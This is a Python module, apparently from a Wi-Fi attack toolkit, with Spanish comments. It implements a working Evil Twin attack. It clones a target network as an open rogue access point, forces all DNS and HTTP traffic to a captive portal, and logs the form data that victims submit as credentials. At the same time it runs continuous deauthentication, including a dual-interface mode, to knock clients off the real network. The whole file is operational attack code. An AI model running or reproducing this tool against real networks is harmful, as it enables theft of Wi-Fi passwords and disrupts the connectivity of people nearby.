"""
dragonfly/services/evil_twin_service.py - Servicio de ataque Evil Twin y portal cautivo.
Orquesta hostapd, dnsmasq, iptables, servidor HTTP multihilo de captura y desautenticación continua.
"""

import os
import time
import shutil
import subprocess
import threading
from dragonfly.config import BASE_DIR_EVIL, DIR_EVIL_PORTALS
from dragonfly.core.process_manager import ProcessManager
from dragonfly.core.subprocess_utils import safe_popen, safe_run
from dragonfly.core.session import SessionManager


class EvilTwinService:
    """
    Gestiona el despliegue del Rogue AP, portal cautivo HTTP y captura de credenciales.
    """

    def __init__(self, process_manager: ProcessManager = None):
        self.pm = process_manager or ProcessManager()
        self.is_running = False
        self._stop_event = threading.Event()
        self._worker_thread = None
        self.active_session_dir = None
        self.multi_deauth = None

    @staticmethod
    def list_portals():
        """
        Escanea la carpeta de portales y retorna aquellos que poseen un index.html válido.
        """
        if not os.path.exists(DIR_EVIL_PORTALS):
            return []
        portales = []
        try:
            for item in os.listdir(DIR_EVIL_PORTALS):
                p_dir = os.path.join(DIR_EVIL_PORTALS, item)
                if os.path.isdir(p_dir) and os.path.exists(os.path.join(p_dir, "index.html")):
                    portales.append(item)
            return sorted(portales)
        except Exception:
            return []

    def start_evil_twin(self, ap_iface: str, mon_deauth: str, red_target: dict, portal_name: str,
                        deauth_mode: str = "broadcast", cliente_mac: str = None,
                        on_output=None, on_cred=None):
        """
        Inicia el ataque completo de Evil Twin con un punto de acceso falso y deauth en paralelo.
        """
        self._stop_event.clear()
        self.is_running = True

        def runner():
            session_dir = SessionManager.create_session(BASE_DIR_EVIL)
            self.active_session_dir = session_dir
            timestamp = os.path.basename(session_dir).replace("Auditoria-", "")

            if on_output:
                on_output(f"[*] Iniciando Evil Twin contra: {red_target.get('essid', 'Desconocido')}")
                on_output(f"[*] Sesión guardada en: {session_dir}")

            self._limpiar_procesos_previos()

            # 1. Preparar directorio web temporal
            tmp_web = f"/tmp/evil_twin_web_{timestamp}"
            os.makedirs(tmp_web, exist_ok=True)
            portal_source = os.path.join(DIR_EVIL_PORTALS, portal_name)
            try:
                shutil.copytree(portal_source, tmp_web, dirs_exist_ok=True)
            except Exception as e:
                if on_output:
                    on_output(f"[!] Aviso al copiar portal: {e}")

            cred_log = os.path.join(session_dir, "credentials.log")

            # 2. Generar script servidor de captura (Threaded HTTP Server)
            capture_script = f'''#!/usr/bin/env python3
import http.server, urllib.parse, os
from datetime import datetime

LOG = "{cred_log}"

class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        if parsed_path.query:
            try:
                params = urllib.parse.parse_qs(parsed_path.query)
                with open(LOG, "a") as f:
                    f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} DATA_GET:{{params}}\\n")
                    f.flush(); os.fsync(f.fileno())
            except Exception: pass

        if parsed_path.path == "/":
            self.path = "/index.html"

        local_path = self.translate_path(self.path)
        if not os.path.isfile(local_path):
            if self.path == "/index.html":
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<html><body><h2>Error: index.html no existe.</h2></body></html>")
                return
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1/index.html")
            self.end_headers()
            return
        return super().do_GET()

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length).decode("utf-8", "ignore")
            params = urllib.parse.parse_qs(data)
            with open(LOG, "a") as f:
                f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} CREDENCIALES:{{params}}\\n")
                f.flush(); os.fsync(f.fileno())
        except Exception: pass

        self.send_response(302)
        self.send_header("Location", "http://10.0.0.1/success.html")
        self.end_headers()

    def log_message(self, format, *args): pass

if __name__ == "__main__":
    os.chdir("{tmp_web}")
    class ThreadedServer(http.server.ThreadingHTTPServer):
        allow_reuse_address = True
    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd:
        httpd.serve_forever()
'''
            with open(f"{tmp_web}/capture.py", "w") as f:
                f.write(capture_script)

            if not os.path.exists(f"{tmp_web}/success.html"):
                with open(f"{tmp_web}/success.html", "w") as f:
                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p>Ya puede cerrar esta ventana.</p></body></html>')

            # 3. Levantar Hostapd
            safe_run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red_target['essid']}\nhw_mode=g\nchannel={int(red_target['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
            with open("/tmp/hostapd_evil.conf", "w") as f:
                f.write(hostapd_conf)

            proc_hostapd = safe_popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
                                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.pm.register("hostapd", proc_hostapd)
            time.sleep(3)

            # 4. Configurar IP en la interfaz AP
            safe_run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
            time.sleep(1.5)

            # 5. Levantar Dnsmasq
            dnsmasq_conf = f"interface={ap_iface}\nexcept-interface=lo\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
            with open("/tmp/dnsmasq_evil.conf", "w") as f:
                f.write(dnsmasq_conf)

            safe_run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
            proc_dnsmasq = safe_popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.pm.register("dnsmasq", proc_dnsmasq)
            time.sleep(2)

            # 6. Reglas Iptables
            safe_run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
            for port in ["80", "53"]:
                safe_run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
            for port in ["53", "67"]:
                safe_run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)

            # 7. Servidor Web de Captura
            proc_web = safe_popen(["sudo", "python3", f"{tmp_web}/capture.py"],
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.pm.register("web_server", proc_web)
            time.sleep(1)

            # 8. Ataque deauth en la segunda tarjeta
            safe_run(["sudo", "iw", "dev", mon_deauth, "set", "channel", str(red_target['ch'])],
                           stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red_target['bssid']]
            if deauth_mode == "directed" and cliente_mac:
                deauth_cmd.extend(["-c", cliente_mac])
            deauth_cmd.append(mon_deauth)

            proc_deauth = safe_popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.pm.register("deauth", proc_deauth)

            if on_output:
                on_output("[+] Rogue AP y Servidor Cautivo activos.")
                on_output("[*] Escuchando credenciales entrantes...")

            # 9. Bucle de escucha de credenciales
            last_lines = 0
            while not self._stop_event.is_set():
                time.sleep(2)
                if os.path.exists(cred_log):
                    with open(cred_log, "r") as f:
                        lines = f.readlines()
                        if len(lines) > last_lines:
                            for line in lines[last_lines:]:
                                cleaned = line.strip()
                                if on_output:
                                    on_output(f"[+] Credencial: {cleaned}")
                                if on_cred:
                                    on_cred(cleaned)
                            last_lines = len(lines)

            # 10. Limpieza final
            self.pm.terminate_all()
            ProcessManager.flush_iptables(ap_iface)
            if mon_deauth:
                safe_run(["sudo", "airmon-ng", "stop", mon_deauth], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            ProcessManager.restart_network_manager()

            if on_output:
                on_output("[+] Evil Twin detenido y red restaurada con éxito.")

            self.is_running = False

        self._worker_thread = threading.Thread(target=runner, daemon=True)
        self._worker_thread.start()
        return self._worker_thread

    def start_evil_twin_dual(self, ap_iface: str, mon1: str, mon2: str,
                             red_ap: dict, target1: dict, target2: dict, portal_name: str,
                             on_output=None, on_cred=None):
        """
        Inicia Evil Twin con Rouge AP en ap_iface y desautenticación dual en mon1 y mon2.
        """
        from dragonfly.services.wifi_service import MultiDeauthAttack
        self._stop_event.clear()
        self.is_running = True

        def runner():
            session_dir = SessionManager.create_session(BASE_DIR_EVIL)
            self.active_session_dir = session_dir
            timestamp = os.path.basename(session_dir).replace("Auditoria-", "")

            if on_output:
                on_output(f"[*] Iniciando Evil Twin Dual (AP: {red_ap.get('essid', 'Desconocido')})")
                on_output(f"[*] Sesión guardada en: {session_dir}")

            self._limpiar_procesos_previos()

            # 1. Preparar directorio web temporal
            tmp_web = f"/tmp/evil_twin_web_{timestamp}"
            os.makedirs(tmp_web, exist_ok=True)
            portal_source = os.path.join(DIR_EVIL_PORTALS, portal_name)
            try:
                shutil.copytree(portal_source, tmp_web, dirs_exist_ok=True)
            except Exception as e:
                if on_output:
                    on_output(f"[!] Aviso al copiar portal: {e}")

            cred_log = os.path.join(session_dir, "credentials.log")

            # 2. Servidor HTTP de captura
            capture_script = f'''#!/usr/bin/env python3
import http.server, urllib.parse, os
from datetime import datetime

LOG = "{cred_log}"

class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        if parsed_path.query:
            try:
                params = urllib.parse.parse_qs(parsed_path.query)
                with open(LOG, "a") as f:
                    f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} DATA_GET:{{params}}\\n")
                    f.flush(); os.fsync(f.fileno())
            except Exception: pass

        if parsed_path.path == "/":
            self.path = "/index.html"

        local_path = self.translate_path(self.path)
        if not os.path.isfile(local_path):
            if self.path == "/index.html":
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<html><body><h2>Error: index.html no existe.</h2></body></html>")
                return
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1/index.html")
            self.end_headers()
            return
        return super().do_GET()

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length).decode("utf-8", "ignore")
            params = urllib.parse.parse_qs(data)
            with open(LOG, "a") as f:
                f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} CREDENCIALES:{{params}}\\n")
                f.flush(); os.fsync(f.fileno())
        except Exception: pass

        self.send_response(302)
        self.send_header("Location", "http://10.0.0.1/success.html")
        self.end_headers()

    def log_message(self, format, *args): pass

if __name__ == "__main__":
    os.chdir("{tmp_web}")
    class ThreadedServer(http.server.ThreadingHTTPServer):
        allow_reuse_address = True
    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd:
        httpd.serve_forever()
'''
            with open(f"{tmp_web}/capture.py", "w") as f:
                f.write(capture_script)

            if not os.path.exists(f"{tmp_web}/success.html"):
                with open(f"{tmp_web}/success.html", "w") as f:
                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p>Ya puede cerrar esta ventana.</p></body></html>')

            # 3. Hostapd
            safe_run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red_ap['essid']}\nhw_mode=g\nchannel={int(red_ap['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
            with open("/tmp/hostapd_evil.conf", "w") as f:
                f.write(hostapd_conf)

            proc_hostapd = safe_popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
                                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.pm.register("hostapd", proc_hostapd)
            time.sleep(3)

            # 4. Configurar IP
            safe_run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
            time.sleep(1.5)

            # 5. Dnsmasq
            dnsmasq_conf = f"interface={ap_iface}\nexcept-interface=lo\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
            with open("/tmp/dnsmasq_evil.conf", "w") as f:
                f.write(dnsmasq_conf)

            safe_run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
            proc_dnsmasq = safe_popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.pm.register("dnsmasq", proc_dnsmasq)
            time.sleep(2)

            # 6. Reglas Iptables
            safe_run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
            safe_run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
            for port in ["80", "53"]:
                safe_run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
            for port in ["53", "67"]:
                safe_run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)

            # 7. Servidor Web
            proc_web = safe_popen(["sudo", "python3", f"{tmp_web}/capture.py"],
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.pm.register("web_server", proc_web)
            time.sleep(1)

            # 8. Deauth Dual con MultiDeauthAttack
            safe_run(["sudo", "iw", "dev", mon1, "set", "channel", str(target1['ch'])], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            safe_run(["sudo", "iw", "dev", mon2, "set", "channel", str(target2['ch'])], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

            self.multi_deauth = MultiDeauthAttack(
                mon_ifaces=[mon1, mon2],
                bssids=[target1['bssid'], target2['bssid']],
                channels=[str(target1['ch']), str(target2['ch'])],
                burst=0,
                callback=on_output
            )
            self.multi_deauth.start()

            if on_output:
                on_output("[+] Rogue AP y Servidor Cautivo activos con Deauth Dual.")
                on_output("[*] Escuchando credenciales entrantes...")

            # 9. Bucle de escucha
            last_lines = 0
            while not self._stop_event.is_set():
                time.sleep(2)
                if os.path.exists(cred_log):
                    with open(cred_log, "r") as f:
                        lines = f.readlines()
                        if len(lines) > last_lines:
                            for line in lines[last_lines:]:
                                cleaned = line.strip()
                                if on_output:
                                    on_output(f"[+] Credencial: {cleaned}")
                                if on_cred:
                                    on_cred(cleaned)
                            last_lines = len(lines)

            # 10. Limpieza final
            self.pm.terminate_all()
            if self.multi_deauth:
                self.multi_deauth.stop()
                self.multi_deauth = None
            ProcessManager.flush_iptables(ap_iface)
            for m in [mon1, mon2]:
                if m:
                    safe_run(["sudo", "airmon-ng", "stop", m], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            ProcessManager.restart_network_manager()

            if on_output:
                on_output("[+] Evil Twin Dual detenido y red restaurada con éxito.")

            self.is_running = False

        self._worker_thread = threading.Thread(target=runner, daemon=True)
        self._worker_thread.start()
        return self._worker_thread

    def _limpiar_procesos_previos(self):
        """Mata procesos huérfanos de ataques anteriores."""
        self.pm.terminate_all()
        ProcessManager.pkill("hostapd.*evil")
        ProcessManager.pkill("dnsmasq.*evil")
        ProcessManager.pkill("capture.py")
        ProcessManager.pkill("aireplay-ng")

    def stop_evil_twin(self):
        """Envía la señal de parada al ataque Evil Twin."""
        self._stop_event.set()
        if self.multi_deauth:
            try:
                self.multi_deauth.stop()
            except Exception:
                pass
            self.multi_deauth = None
        self.is_running = False

    def list_saved_sessions(self):
        """Retorna las sesiones de auditoría de Evil Twin guardadas."""
        return SessionManager.list_sessions(BASE_DIR_EVIL)

    def read_credentials(self, session_name: str) -> str:
        """Lee el archivo credentials.log de una sesión."""
        log_file = os.path.join(BASE_DIR_EVIL, session_name, "credentials.log")
        return SessionManager.read_file(log_file)
